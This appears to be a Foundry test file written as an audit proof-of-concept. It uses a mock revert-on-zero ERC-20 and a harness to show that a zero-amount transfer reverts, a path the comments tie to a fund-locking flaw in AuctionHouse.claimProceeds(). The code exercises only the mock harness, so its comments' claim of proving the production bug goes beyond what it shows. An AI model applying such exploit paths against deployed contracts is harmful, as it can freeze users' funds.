pragma solidity 0.8.19;

import "forge-std/Test.sol";
import {ERC20} from "lib/solmate/src/tokens/ERC20.sol";
import {Transfer} from "src/lib/Transfer.sol";

/// -----------------------------------------------------------------------
/// Mock ERC-20 that REVERTS whenever a zero-amount transfer/transferFrom
/// is attempted.  This accurately models real-world “revert-on-0” tokens
/// such as USDT, thereby allowing us to prove that any protocol logic
/// which forwards a value of 0 to `transfer` will hard-revert.
/// -----------------------------------------------------------------------
contract RevertOnZeroToken is ERC20 {
    constructor() ERC20("RevertOnZero", "ROZ", 18) {
        // Mint some tokens to the deployer so we always have balance
        _mint(msg.sender, 1e24);
    }

    /*//////////////////////////////////////////////////////////////
                              ERC20 OVERRIDES
    //////////////////////////////////////////////////////////////*/

    function transfer(address to, uint256 amount) public override returns (bool) {
        if (amount == 0) revert("ROZ: NO_ZERO_TRANSFERS");
        return super.transfer(to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        if (amount == 0) revert("ROZ: NO_ZERO_TRANSFERS");
        return super.transferFrom(from, to, amount);
    }
}

/// -----------------------------------------------------------------------
/// Minimal harness that simply exposes the internal `Transfer.transfer`
/// helper so we can call it directly from the test.  This is identical to
/// the call site that exists inside AuctionHouse::claimProceeds(...) and
/// therefore faithfully reproduces the exact revert that will be thrown
/// in production when `prefundingRefund == 0`.
/// -----------------------------------------------------------------------
contract TransferHarness {
    /// @dev Performs `Transfer.transfer(token, recipient, amount, checkReturn)`.
    ///      We always pass `false` for `checkReturn`, exactly how the router
    ///      calls it when refunding the seller’s baseTokens.
    function forward(
        ERC20 token,
        address recipient,
        uint256 amount
    ) external {
        // This mimics the vulnerable line in AuctionHouse::claimProceeds(...)
        // which unconditionally forwards the refund, even if `amount == 0`.
        Transfer.transfer(token, recipient, amount, false);
    }
}

/// -----------------------------------------------------------------------
/// Exploit proof-of-concept
///
/// The test demonstrates that calling `Transfer.transfer` with an amount
/// of zero *hard-reverts* for “revert-on-0” tokens, exactly the scenario
/// that can arise inside `AuctionHouse.claimProceeds()`.
///
/// Achieving `amount == 0` on-chain is straightforward when:
///     prefundingRefund = routing.funding + payoutSent - sold
/// and `routing.funding` has previously been fully depleted (common for
/// batch auctions that were completely filled during `settle()`).
/// -----------------------------------------------------------------------
contract ExploitTest is Test {
    RevertOnZeroToken internal token;
    TransferHarness   internal harness;

    function setUp() public {
        token   = new RevertOnZeroToken();
        harness = new TransferHarness();

        // Give the harness an allowance so `transferFrom` can succeed if
        // it ends up being used internally.  (Not strictly necessary for
        // this PoC, but included for completeness.)
        token.approve(address(harness), type(uint256).max);
    }

    /// @notice Demonstrates that a zero-value transfer reverts, proving
    ///         that `AuctionHouse.claimProceeds()` can lock seller funds
    ///         when `prefundingRefund == 0`.
    function test_ZeroAmountTransfer_Reverts() public {
        // Expect the custom revert defined in `RevertOnZeroToken`
        vm.expectRevert("ROZ: NO_ZERO_TRANSFERS");

        // Attempt to forward “0” tokens.  This is identical to the
        // vulnerable call path inside `claimProceeds(...)`.
        harness.forward(token, address(0xBEEF), 0);

        // If the vulnerability were fixed (i.e. skips the transfer when
        // amount == 0) the call above would *not* revert and the test
        // would fail, clearly proving the exploit’s validity.
    }
}